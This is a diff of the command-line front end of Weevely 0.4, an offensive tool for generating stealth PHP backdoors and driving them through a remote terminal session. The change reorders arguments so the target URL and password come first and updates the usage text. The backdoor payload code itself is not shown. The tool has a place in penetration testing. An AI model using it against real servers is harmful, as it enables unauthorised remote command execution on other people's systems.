@@ -32,13 +32,13 @@ Weevely 0.4 - Generate and manage stealth PHP backdoors
 if __name__ == "__main__":
 
     
-    if  len(sys.argv) == 4 and sys.argv[1] == 'terminal':
+    if  len(sys.argv) == 3 and sys.argv[1].startswith('http'):
         
-        print '''[+] Starting telnet-like session. Show available modules with :help
-[+] and run modules using :<module name> <argument1> <arg2> ...
+        print '''[+] Starting telnet-like session. Show modules help with :help 
+[+] and run it using :<module name> <argument1> <arg2> ...
 '''
-        url = sys.argv[2]
-        password = sys.argv[3]
+        url = sys.argv[1]
+        password = sys.argv[2]
           
         try:
             Terminal ( ModHandler( url, password ) ).loop()
@@ -48,38 +48,37 @@ if __name__ == "__main__":
     elif len(sys.argv) == 4 and sys.argv[1] == 'generate':
         Backdoor( sys.argv[2] ).save( sys.argv[3] )
         
-    elif len(sys.argv) > 4 and sys.argv[1] == 'cmd':
+    elif len(sys.argv) > 3 and sys.argv[1].startswith('http'):
 
-        url = sys.argv[2]
-        password = sys.argv[3]        
+        url = sys.argv[1]
+        password = sys.argv[2]        
         
         try:
             
             terminal = Terminal (ModHandler(url, password), True)
-            if sys.argv[4][0] == terminal.module_char:
-                terminal.run_module_cmd(sys.argv[4:])
+            if sys.argv[3][0] == terminal.module_char:
+                terminal.run_module_cmd(sys.argv[3:])
             else:
-                terminal.run_line_cmd(' '.join(sys.argv[4:]))
+                terminal.run_line_cmd(' '.join(sys.argv[3:]))
             
             
         except KeyboardInterrupt:
             print '\n[!] Exiting. Bye ^^'
     else:
         
-        print '''
-Start telnet-like session
-  ./weevely.py terminal <url> <password> 
+        print '''Start telnet-like session
+  ./weevely.py <url> <password> 
+  
+Run single command or module
+  ./weevely.py <url> <password> <command> 
+  ./weevely.py <url> <password> :<module name> <argument1> <arg2> ..
 
-Execute single shell command, run :module or show module :help
-  ./weevely.py cmd <url> <password> <command> 
-  ./weevely.py cmd <url> <password> :<module name> <argument1> <arg2> ..
-
-Generate php backdoor
+Generate PHP backdoor script
   ./weevely.py generate <password> <output path> 
 
-Execute :help as command to show module documentation. Modules:'''  
+Show modules help with :help and run it using :<module name>. Modules:'''  
         
         ModHandler().print_module_summary()
             
-        print ''
+        print '\n'
     
